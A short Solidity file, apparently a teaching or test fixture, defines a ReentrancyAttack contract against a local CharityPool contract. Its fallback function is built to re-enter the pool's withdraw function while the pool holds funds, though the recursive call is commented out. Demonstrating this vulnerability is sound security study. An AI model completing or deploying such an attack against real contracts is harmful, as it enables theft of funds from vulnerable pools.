
pragma solidity ^0.5.0;


import './CharityPool.sol';

contract ReentrancyAttack {

    uint8 public MIN_CHARITY_BALANCE = 4;
    uint256 public WEI_SCALE = 10**18;

    CharityPool public charityPool;

    constructor(address _charityPool) public {
        charityPool = CharityPool(_charityPool);
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }


    // Callback function to continue the attack.
    function() external payable {
        if (address(charityPool).balance >= MIN_CHARITY_BALANCE * WEI_SCALE) {
            //charityPool.withdraw();
        }
    }

    function initiateAttack() public {
        charityPool.withdraw();
    }

}
